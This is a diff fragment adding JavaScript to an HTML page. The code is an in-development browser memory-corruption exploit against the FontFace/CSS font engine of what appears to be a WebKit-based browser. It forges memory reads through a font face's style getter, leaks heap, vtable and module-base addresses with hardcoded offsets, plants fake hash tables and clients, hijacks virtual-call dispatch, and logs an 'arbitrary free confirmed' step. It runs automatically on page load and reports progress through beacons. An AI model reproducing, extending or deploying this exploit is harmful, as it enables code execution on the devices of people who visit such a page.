+             Q2 (only if Q1 match): aim [L2+8..L2+24) = WeakPtrImpl+8, the
+             original target. Pointer-shaped bytes => leak extension no SELF. */
+          try{document.fonts.delete(faces[zi]);}catch(eD1){bs('DEL-ERR');}
+          forgeRead(L1,16);
+          var q1='';
+          try{q1=dec(String(faces[zi].style),64);}catch(e1){q1='THROW';}
+          bs('L1Q-'+q1.slice(0,64));
+          var exp='';
+          for(var s2=0n;s2<8n;s2++)exp+=(Number((L2>>(s2*8n))&0xFFn)+256).toString(16).slice(1);
+          var ok1=(q1.slice(16,32)===exp);
+          bs('L1Q-B0-'+q1.slice(0,2)+'-MATCH-'+(ok1?'1':'0'));
+          if(ok1){
+            forgeRead(L2+8n,16);
+            var q2='';
+            try{q2=dec(String(faces[zi].style),64);}catch(e2){q2='THROW';}
+            bs('L2Q2-'+q2.slice(0,64));
+          }
+          return;
+        }
+        b('SELF-0x'+self.toString(16));
+        try{localStorage.setItem('p691_self', self.toString(16));}catch(e){}
+        if(RTT){clearTimeout(RTT);RTT=0;}
+        try{localStorage.removeItem('p691_s3');localStorage.removeItem('p691_dead');}catch(e){}
+
+        for(var iv=0;iv<window.__sp.length;iv++){
+          if(le(window.__sp[iv],0x58)>0x1000000000n)continue;
+          var wv=window.__sp[iv],mk=0x1000+iv;
+          wv[0x40]=0;wv[0x41]=0;wv[0x42]=0;wv[0x43]=0;
+          wv[0x44]=mk&0xFF;wv[0x45]=(mk>>8)&0xFF;wv[0x46]=0;wv[0x47]=0;
+        }
+
+        /* --- Step 7: VTAB search --- */
+        var VTAB=0n;
+        /* v12: the scan already knows a marked lane's address+index (SPMAP
+           datum). The old 64B-step search can never reach +0x44 of an
+           0x80-aligned lane (offset ≡4 mod 64) and its prefilter only accepts
+           marker 0x1000 (lane 0) — structurally dead. Use the scan's find. */
+        if(firstSpAddr!==0n){
+          VTAB=firstSpAddr+0x44n;SKIPJ=firstSpIdx;
+          b('VTAB-0x'+VTAB.toString(16)+'-j'+SKIPJ+'-SCANPIN');
+        }
+        for(var sv=1;sv<=256&&VTAB===0n;sv++){
+          var cd=self-BigInt(sv*64);
+          setR(cd);
+          if(chk(0x1000)===true&&chk(0x1001)===false){
+            var jj=Number(boundary(cd))-0x1000;
+            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;b('VTAB-0x'+cd.toString(16)+'-j'+jj);break;}
+          }
+        }
+        if(VTAB===0n){
+          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
+            var cu=self+BigInt(sv2*64);
+            setR(cu);
+            if(chk(0x1000)===true&&chk(0x1001)===false){
+              var jj2=Number(boundary(cu))-0x1000;
+              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;b('VTAB-0x'+cu.toString(16)+'-j'+jj2);break;}
+            }
+          }
+        }
+        if(VTAB===0n)b('VTAB-NONE');
+
+        /* --- style-read helpers --- */
+        function restoreAndForge(snap2,daddr,dlen){
+          for(var ib3=0;ib3<window.__sp.length;ib3++){
+            var vb3=window.__sp[ib3];if(!vb3)continue;
+            if(SKIPJ>=0&&ib3===SKIPJ)continue;
+            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap2[dd2];
+          }
+          forgeRead(daddr,dlen);
+        }
+
+        /* ============================================================
+           FIX #1: Remove face from document.fonts BEFORE forgeRead.
+           face.style (getter) works without being in the font set.
+           This prevents the layout engine from dereferencing our
+           modified buffer fields between forgeRead and readStyle.
+           ============================================================ */
+        bs('DEL-PRE-FORGE');
+        try{document.fonts.delete(faces[zi]);}catch(e){bs('DEL-ERR');}
+        bs('DEL-OK');
+
+        /* --- Immediate hash table read (selfFound=true, before bucket decay) --- */
+        var cachedHT='';
+        var preSnap=new Uint8Array(SIZE);
+        if(bufs.length>0)for(var ps0=0;ps0<SIZE;ps0++)preSnap[ps0]=bufs[0][0][ps0];
+        forgeRead(L1-0x10n,80);
+        try{cachedHT=dec(String(faces[zi].style),128);bs('IHT-ok-'+cachedHT.length);}catch(e){bs('IHT-err');}
+        for(var pr0=0;pr0<window.__sp.length;pr0++){var prv=window.__sp[pr0];if(!prv)continue;if(SKIPJ>=0&&pr0===SKIPJ)continue;for(var pr1=0;pr1<SIZE;pr1++)prv[pr1]=preSnap[pr1];}
+
+        /* --- Step 8: SYNCHRONOUS walk chain ---
+           After IHT, the CSS engine is "poisoned" — any yield point (setTimeout,
+           DOM write via b(), sync XHR via bs()) lets deferred C++ events fire and
+           crash the process. Solution: do ALL readStyle calls in one synchronous
+           JS execution frame with ZERO intermediate beacons or yields.
+           ------------------------------------------------------------ */
+        var snap2=preSnap;
+        var hw='',h2='',h3='',h4='',h5='';
+        var IM=0n,FO=0n,VP=0n;
+        var S0=0n,S1=0n,S2=0n,S3=0n,Q4=0n,R5=0n,R6=0n,R7=0n,S8=0n;
+        var walkOK=false;
+        var raw4='',wt4='';
+        var gotData='',gotAddr=0n,vp10='',vtDump='';
+        var k5Dump='',tblDump='';
+
+        if(cachedHT.length>=160){
+          hw=cachedHT;
+
+          /* W1: parse hash table buckets from cached IHT data */
+          var seen=0;
+          for(var gb=2;gb<10;gb++){
+            var hb=hw.slice(gb*16,gb*16+16);
+            if(/^[0-9a-f]{16}$/.test(hb)){
+              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
+              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
+            }
+          }
+
+          if(IM!==0n){
+            /* W2: read WeakPtrImpl+8 → m_ptr (client/CSSFontFaceSet*) — SYNC, no beacon */
+            restoreAndForge(snap2,IM+8n,16);
+            h2=readStyle();
+            var hf=h2.slice(0,16);
+            if(/^[0-9a-f]{16}$/.test(hf)){
+              FO=BigInt('0x'+hf.match(/../g).reverse().join(''));
+            }
+
+            if(FO>0x1000000000n){
+              /* W3: read client object → vtable pointer at +0x00 — SYNC */
+              restoreAndForge(snap2,FO,32);
+              h3=readStyle();
+              var hv=h3.slice(0,16),hz=h3.slice(32,48);
+              if(/^[0-9a-f]{16}$/.test(hv)){
+                VP=BigInt('0x'+hv.match(/../g).reverse().join(''));
+            }
+              if(/^[0-9a-f]{16}$/.test(hz)){
+                var s2=BigInt('0x'+hz.match(/../g).reverse().join(''));
+                if(s2>0x1000000000n&&s2<0x10000000000n)self=s2;
+            }
+
+              if(VP>0x100000000n){
+                /* YIELD: restore safe state, sync XHR to reset CSS engine tick budget */
+                for(var yr=0;yr<window.__sp.length;yr++){
+                  var yrv=window.__sp[yr];if(!yrv)continue;
+                  if(SKIPJ>=0&&yr===SKIPJ)continue;
+                  for(var yr2=0;yr2<SIZE;yr2++)yrv[yr2]=snap2[yr2];
+            }
+                bs('W3-MID');
+
+                /* W4: read 128B vtable + RVAs (slots stable on 14.10 retail) */
+                restoreAndForge(snap2,VP,128);
+                h4=readStyle();
+                S0=VP-0x1710B78n;
+                S1=S0+0x30n;
+                S2=VP-0x324C3D8n;
+                S3=VP-0x1710478n;
+                Q4=VP-0x17103F8n; /* fontPropertyChanged (slot 4) — probe-only */
+                R5=Q4;
+                R6=VP-0x1ABA728n;
+                R7=VP-0x1710318n;
+                walkOK=true;
+                if(h4.length<128){
+                  walkOK=false;
+                  bs('VT-READ-SHORT-'+h4.length);
+            }
+            }
+            }
+          }
+        }
+
+        var BASE=0n;
+        if(walkOK&&VP>0x100000000n){BASE=VP-0xC6A1B28n;}
+
+        /* Restore all buffers to safe state BEFORE any beacon */
+        for(var rr=0;rr<window.__sp.length;rr++){
+          var rrv=window.__sp[rr];if(!rrv)continue;
+          if(SKIPJ>=0&&rr===SKIPJ)continue;
+          for(var rr2=0;rr2<SIZE;rr2++)rrv[rr2]=snap2[rr2];
+        }
+
+        /* === NOW safe to beacon — all CSS reads are done === */
+        bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
+        bs('WALK-h4len='+h4.length);
+        if(h4.length>=128)bs('WALK-VT='+h4.slice(0,144));
+        bs('WALK-ok='+walkOK);
+        if(BASE>0n)bs('BASE-'+hex(BASE));
+        if(k5Dump)bs('ID-EDGE='+k5Dump.slice(0,32));
+        if(VP>0n){
+          bs('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
+          bs('VT-s3='+hex(S3)+',s4='+hex(Q4)+',s5='+hex(R5));
+          bs('VT-s6='+hex(R6)+',s7='+hex(R7)+',s8='+hex(S8));
+        }
+
+        if(RTT){clearTimeout(RTT);RTT=0;}
+
+        if(!walkOK){
+          bs('WALK-FAIL');
+          verd('bad','WALK FAIL IM='+hex(IM)+' FO='+hex(FO)+' VP='+hex(VP));
+          return;
+        }
+
+        if(COOP===0){
+          bs('WALK-STOP');
+          verd('ok','WALK-ok SELF='+hex(self)+'<br>VP='+hex(VP));
+          return;
+        }
+
+        /* --- COOP: vtable-backed dispatch (module VP or heap copy) --- */
+        var slots=[];
+        for(var vs=0;vs<16;vs++){
+          var sh=h4.slice(vs*16,vs*16+16);
+          var sv2=0n;
+          if(/^[0-9a-f]{16}$/.test(sh))sv2=BigInt('0x'+sh.match(/../g).reverse().join(''));
+          if(sv2<0x100000000n)sv2=(vs===0?S0:vs===2?S2:vs===3?S3:vs===4?Q4:vs===6?R6:vs===7?R7:S2);
+          slots.push(sv2);
+        }
+        var vptrTarget=VP;
+        if(COOP===2){
+          if(SKIPJ<0||VTAB===0n){bs('COOP-NO-VTAB');verd('bad','NO VTAB lane');return;}
+          /* v31 GEOMETRY FIX: the copied slots live at sk+8+8j (address
+             firstSpAddr+8+8j). The old vptrTarget=VTAB+8=firstSpAddr+0x4C was
+             HALF-SLOT MISALIGNED (VTAB was the +0x44 search marker, not a
+             vtable) — every dispatched slot i was read at +0x4C+8i, a
+             straddle of written slots (i=6 -> bytes +0x7C..+0x84, composite
+             ~0x2_00000008 = wild pointer). That killed EVERY yield regardless
+             of pk/sw stubs (which wrote to +8+8i, never read). vptr must
+             point at slot 0 = firstSpAddr+8. */
+          vptrTarget=firstSpAddr+8n;
+          if(VTR&&VP>0x100000000n){vptrTarget=VP;bs('VTR-REAL-vp'+hex(VP));} /* fix: module band 0x80-0x82xxxxxxxx is BELOW 0x1000000000 — gate on 0x100000000 */
+          var sk=window.__sp[SKIPJ];
+          for(var jv=0;jv<16;jv++){put64(sk,8+jv*8,slots[jv]);}
+          for(var zz=0x80;zz<0xC0;zz++)sk[zz]=0;
+          put32(sk,0x80,2);put64(sk,0x88,vptrTarget);put32(sk,0x90,CE?0:2);
+          put32(sk,0x68,RCW);put32(sk,0x6C,0); /* v31: sane rc word at client-0x20 (= copied slot 12, u32@+0x68) — real ref()/deref() increment/decrement THIS; 0x1000 keeps it far from 0 and from the delete path */ /* v29b: client+8 = CanMakeWeakPtr m_weakImpls — must be NULL on the hosted client (2 was a wild weak-impl ptr). FontFace layout: RefCounted@client-0x20, ActiveDOMObject@client-0x18, Client@client (ott -32, walk-confirmed). */
+          if(PK===16&&IVP){
+            for(var pa=0;pa<16;pa++)put64(sk,8+pa*8,0x4141414141414141n);
+          }else if(PK>=0&&PK<16){
+            /* v23: sw/sw2 = copy a REAL slot pointer into slot pk/pk2 —
+               the chosen-call mode. pk=6&sw=5&pk2=4&sw2=5 makes ref() and
+               fontPropertyChanged both invoke the default-empty stub: if the
+               notify survives to FAM-AFTER, the engine called OUR chosen
+               function through OUR table = COOP proof of concept. */
+            var poison=IVP?0x4141414141414141n:slots[PK];
+            if(SW>=0&&SW<16)poison=slots[SW];
+            put64(sk,8+PK*8,poison);
+            if(PK2>=0&&PK2<16){
+              var poison2=(SW2>=0&&SW2<16)?slots[SW2]:slots[PK2];
+              put64(sk,8+PK2*8,poison2);
+              bs('SWAP-pk'+PK+'<-s'+SW+',pk2'+PK2+'<-s'+SW2);
+              if(PK3>=0&&PK3<16){var poison3=(SW3>=0&&SW3<16)?slots[SW3]:slots[PK3];put64(sk,8+PK3*8,poison3);bs('SWAP3-pk'+PK3+'<-s'+SW3);}
+            }
+          }
+          /* v32: snapshot the whole sk surface (slots, swaps, header,
+             client vptr/rc/weak) — the sk lane is a LIVE engine object and
+             gets stomped between LAY and dispatch like m_table did (v21);
+             the REPLANT phase below restores it. */
+          window.__skSnap=sk.slice(0,0xC0);
+          bs('COOP-HEAP-vt='+hex(vptrTarget)+',pk='+PK);
+        }else{
+          bs('COOP-MOD-vptr='+hex(VP));
+        }
+
+        try{
+          for(var kc2=0;kc2<window.__sp.length;kc2++){
+            var wc=window.__sp[kc2];if(!wc)continue;
+            if(SKIPJ>=0&&kc2===SKIPJ)continue;
+            for(var dd2=0;dd2<SIZE;dd2++)wc[dd2]=snap2[dd2];
+            wc[0]=2;wc[1]=0;wc[2]=0;wc[3]=0;
+            put64(wc,0x08,self+0x60n);wc[0x10]=0;
+            wc[0x50]=0;wc[0x51]=0;wc[0x52]=0;wc[0x53]=0;
+            wc[0x54]=0;wc[0x55]=0;wc[0x56]=0;wc[0x57]=0;
+            put64(wc,0x58,MT?self+0x98n:0n);
+            if(LK){put64(wc,0x60,0n);put64(wc,0x68,self+0x50n);}
+            else{
+              /* v16 (source-pinned, CSSFontFace.cpp:591 + WeakHashSet/HashTable
+                 16B at +0x58): tableSize@+0x60, keyCount@+0x64. keyCount=0 made
+                 iterateClients see an EMPTY table in every prior load — the
+                 forged client was never visited. keyCount=1 => bucket[0] is
+                 read => impl => m_ptr => client => Ref => virtual ref() (slot
+                 6) BEFORE any callback. With pk=16 a crash here attributes
+                 cleanly to the vcall (setters touch no timer/sources). */
+              put32(wc,0x60,1);put32(wc,0x64,1);
+            }
+            wc[0x82]=3; /* v16: Status::Success — pump() no-ops entirely
+                           (CSSFontFace.cpp:646/694/696 all skip): the load()
+                           trigger can no longer reach the zeroed timer
+                           (Timer.cpp:469 RELEASE_ASSERT) */
+            put32(wc,0x70,1);put32(wc,0x74,0);
+            put32(wc,0x88,0);put32(wc,0x8C,KC);
+            put32(wc,0x90,0);put32(wc,0x94,1);
+            put64(wc,0x98,BK?self+0xA0n:0n);
+            put32(wc,0xA0,2);put32(wc,0xA4,0);
+            if(!NC){
+              if(NP){
+                /* v30b: occupied bucket + DEAD impl (m_ptr=0) — skipEmptyBuckets
+                   must skip it (WeakHashSet.h:55) and the yield must come out
+                   empty like eb=1. Survives => the kill needs impl->get()
+                   non-null (bisect at the Ref/callback boundary). Dies => the
+                   kill is the HashTable walk itself on the forged header. */
+                put64(wc,0xA8,0n);
+              }else if(FW&&FO!==0n){
+                /* v30 control: yield to the GENUINE client — impl.m_ptr → the
+                   real FontFace's Client subobject (FO+0x20: RefCounted 8 +
+                   ActiveDOMObject 0x18 = ott -32, walk-confirmed). Survives =>
+                   the forged table+impl walk is correct and the kill is our
+                   fake client's shape; dies => the kill is pre-client, in the
+                   WeakHashSet/hash walk of the forged table. */
+                put64(wc,0xA8,FO+0x20n);
+              }else if(CE&&COOP===2&&firstSpAddr!==0n){
+                /* v29 client-elsewhere: m_ptr → hosted client object at
+                   firstSpAddr+0x88 (vptr@+0 = vptrTarget, rc=2@+0x8, zeros).
+                   No client is planted at self+CLI in this mode. */
+                put64(wc,0xA8,firstSpAddr+0x88n);
+              }else{put64(wc,0xA8,self+BigInt(CLI));put64(wc,CLI,vptrTarget);}
+            }
+          }
+          bs('LAY-OK-coop='+COOP+',cli='+CLI+',vptr='+hex(vptrTarget)+(NC?'-NOCLI':'')+((CE&&COOP===2&&firstSpAddr!==0n)?'-CE@'+hex(firstSpAddr+0x88n):''));
+        }catch(eL){bs('LAY-ERR-'+String(eL&&eL.message||eL).slice(0,60));return;}
+
+        /* Do not touch the DOM after LAY — verd()/fonts.add/style getter
+           force layout and can vcall the forged Client before RIP2-GO. */
+        if(CTL===1){bs('RIP2-CTL1-DONE');return;}
+        bs('RIP2-GO-co'+COOP+'-vp'+hex(vptrTarget));
+        /* control: style setter — pk=16 verdict says NO dispatch via copy */
+        try{faces[zi].style=SV;bs('RIP2-AFTER-STYLE');}
+        catch(e){bs('RIP2-ERR-S-'+String(e&&e.message||e).slice(0,40));}
+        /* v17: aftermath instrumentation — microtasks are FIFO, so:
+           MT-PRE (queued pre-load) runs, MT-POST doesn't  => the killer is the
+             ENGINE microtask queued during load() (promise resolution)
+           neither MT arrives                        => death before microtask
+             flush (sync tail of load() binding)
+           both MTs arrive, T0 doesn't                => death in task/timer-0
+             phase (queued engine task) */
+        try{queueMicrotask(function(){bs('RIP2-MT-PRE');});}catch(e){}
+        try{
+          var lpr=NL?null:faces[zi].load();
+          if(NL)bs('RIP2-NOLOAD');
+          else bs('RIP2-CALL-OK');
+          if(lpr&&lpr.then)lpr.then(function(){bs('RIP2-LOADED');},
+            function(er){bs('RIP2-REJECT-'+String(er&&er.name||er).slice(0,24));});
+        }catch(e){bs('RIP2-ERR-L-'+String(e&&e.message||e).slice(0,40));}
+        /* v18: property-setter dispatch attempt. Setters early-return when
+           old==new (why style='italic' never notified) — use a guaranteed NEW
+           family value. setFamilies → iterateClients → fontPropertyChanged,
+           no status/timer/sources (source-pinned). With kc=1 + client +
+           pk=16, a crash between FAM-GO and FAM-AFTER = vcall through the
+           poisoned copy = DISPATCH. */
+        /* v21: the engine stomps m_table@+0x58 to the module empty-sentinel
+           (0x81b7c2ba0 measured) between LAY and dispatch — that is why every
+           notify saw an empty table and vcalled nobody. The B/I/P/C chain
+           survives. Re-plant the table header in JS right before the setter. */
+        try{var fw2=bufs[0][0];
+          put64(fw2,0x58,self+0x98n);
+          fw2[0x8C]=1;fw2[0x8D]=0;fw2[0x8E]=0;fw2[0x8F]=0; /* keyCount=1 */
+          fw2[0x94]=1;fw2[0x95]=0;fw2[0x96]=0;fw2[0x97]=0; /* tableSize=1 */
+          fw2[0x90]=0;fw2[0x91]=0;fw2[0x92]=0;fw2[0x93]=0; /* mask=0 */
+          if(EB){ /* v26 discriminator: empty bucket + keyCount=1 — machinery
+                     runs (begin/end/copyToVector) but yields nothing. Survives
+                     => crashes were in the YIELD path (Ref -> vcall); crashes
+                     => pure machinery/shape killer. */
+            fw2[0x98]=0;fw2[0x99]=0;fw2[0x9A]=0;fw2[0x9B]=0;
+            fw2[0x9C]=0;fw2[0x9D]=0;fw2[0x9E]=0;fw2[0x9F]=0;
+          }
+          bs('REPLANT-T'+hex(le(fw2,0x58))+(EB?'-EB':''));
+          if(window.__skSnap&&window.__sp[SKIPJ]){
+            var skv=window.__sp[SKIPJ];
+            bs('SKRB-VP'+hex(le(skv,0x88))+',s6-'+hex(le(skv,0x38))+',s4-'+hex(le(skv,0x28)));
+            for(var ib2=0;ib2<0xC0;ib2++)skv[ib2]=window.__skSnap[ib2];
+            bs('SKRB2-VP'+hex(le(skv,0x88))+',s6-'+hex(le(skv,0x38))+',s4-'+hex(le(skv,0x28)));
+          }
+        }catch(e){bs('REPLANT-ERR');}
+        bs('FAM-GO');
+        try{faces[zi].family='zzq'+(Date.now()%1000);bs('FAM-AFTER');}
+        catch(e){bs('FAM-ERR-'+String(e&&e.message||e).slice(0,40));}
+        /* v19: read the reclaim lane back. +0x18 (m_families) changed =>
+           setFamilies RAN on the backing (wrapper accepted) — any miss is in
+           iteration. Still 0 => the setter never reached CSSFontFace (vehicle
+           dead at the wrapper). Also dump table metadata u64s +0x88/+0x90. */
+        try{var fw=bufs[0][0];
+          bs('FAM-W18-'+hex(le(fw,0x18))+',M88-'+hex(le(fw,0x88))+',M90-'+hex(le(fw,0x90)));
+          /* v20: full chain readback at RIP time — m_table(+0x58), bucket[0]
+             (+0x98), impl rc(+0xA0), impl m_ptr(+0xA8), client vptr(+0xB8).
+             Any mismatch vs the plant = the write didn't stick (fix the plant);
+             all matching = the shipped iterateClients differs from source. */
+          bs('FAM-CH-T'+hex(le(fw,0x58))+'-B'+hex(le(fw,0x98))+'-I'+hex(le(fw,0xA0))+'-P'+hex(le(fw,0xA8))+'-C'+hex(le(fw,0xB8)));
+          /* v35: rcw=0 ran delete this -> ~FontFace + operator delete(client-0x20).
+             client-0x20 = sk+0x68; FastMalloc reads chunk metadata at ptr-8 (sk+0x60)
+             and writes freelist linkage into the chunk (sk+0x68..). Dump the region
+             post-trigger: changed bytes vs planted (0) = the free() executed and the
+             allocator now owns our fake chunk = ARBITRARY FREE CONFIRMED. */
+          try{if(window.__sp[SKIPJ]&&RCW===0){
+            var fkv=window.__sp[SKIPJ];
+            bs('FAM-FR-h60-'+hex(le(fkv,0x60))+',c68-'+hex(le(fkv,0x68))+',c70-'+hex(le(fkv,0x70))+',c78-'+hex(le(fkv,0x78))+',c80-'+hex(le(fkv,0x80))+',c88-'+hex(le(fkv,0x88)));
+          }}catch(eF){bs('FAM-FR-ERR');}
+        }catch(e){bs('FAM-RD-ERR-'+String(e&&e.message||e).slice(0,30));}
+        try{queueMicrotask(function(){bs('RIP2-MT-POST');});}catch(e){}
+        setTimeout(function(){bs('RIP2-T0');},0);
+        setTimeout(function(){bs('RIP2-T150');},150);
+        setTimeout(function(){bs('RIP2-T400');bs('RIP2-FIN');},400);
+
+      },60); /* post ADD-OK */
+    },40); /* post FAMILY-OK */
+  },60); /* post FORGED */
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);},0);
+else document.addEventListener('DOMContentLoaded',function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);});
+</script></body></html>
